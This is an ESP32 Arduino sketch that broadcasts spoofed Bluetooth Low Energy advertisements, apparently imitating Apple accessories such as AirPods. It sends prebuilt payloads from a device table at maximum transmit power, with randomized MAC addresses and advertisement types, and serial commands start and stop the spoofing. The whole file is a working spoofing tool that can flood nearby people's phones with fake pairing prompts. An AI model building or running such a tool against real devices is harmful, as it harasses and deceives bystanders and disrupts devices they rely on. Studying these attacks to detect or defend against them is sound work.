
#include <Arduino.h>

#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <esp_arduino_version.h>

#include "devices.hpp"


#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21 
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
#define MAX_TX_POWER ESP_PWR_LVL_P20  
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9   
#endif

BLEAdvertising *pAdvertising;  
uint32_t delayMilliseconds = 1000;

bool isSending = true;
int selectedDeviceIndex;

const uint8_t* selectedDevice = DEVICES[selectedDeviceIndex];  
void setup() {
  Serial.begin(115200);
  Serial.println("Starting ESP32 BLE");

  BLEDevice::init("AirPods 69");


  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);


  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();


  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

void loop() {


  if(Serial.available() > 0) {
    String command = Serial.readStringUntil('\n');
    if(command!="") {
      Serial.println("Command: "+command);
    }

    if(command.startsWith("SET_DEVICE")) {
      selectedDeviceIndex = command.substring(11).toInt();
      selectedDevice = DEVICES[command.substring(11).toInt()];
      Serial.println("Device set to index: |"+String(selectedDeviceIndex)+"|");
    }

    if(command=="start") {
      isSending=true;
      Serial.println("Spoofing enabled");
    } else if(command=="stop") {
      isSending=false;
      Serial.println("Spoofing disabled");
    } 
  }

  if(isSending) {


  Serial.println("[CURRENT DEVICE INDEX] ["+String(selectedDeviceIndex)+"]");
  if(!selectedDeviceIndex) {
    // do something if theres no selected device
  } else {


  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++) {
    dummy_addr[i] = random(256);


    if (i == 0) {
      dummy_addr[i] |= 0xF0;
    }
  }

  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();


  #ifdef ESP_ARDUINO_VERSION_MAJOR
    #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
        oAdvertisementData.addData(String((char*)selectedDevice, 31));
    #else
        oAdvertisementData.addData(std::string((char*)selectedDevice, 31));
    #endif
  #endif


  int adv_type_choice = random(3);
  if (adv_type_choice == 0) {
    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  } else if (adv_type_choice == 1) {
    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  } else {
    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  }


  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
  pAdvertising->setAdvertisementData(oAdvertisementData);


  Serial.println("Sending spoofed ad!");
  pAdvertising->start();


  delay(delayMilliseconds);  
  pAdvertising->stop();
  }
  } else {
    delay(100);
  }
  
}
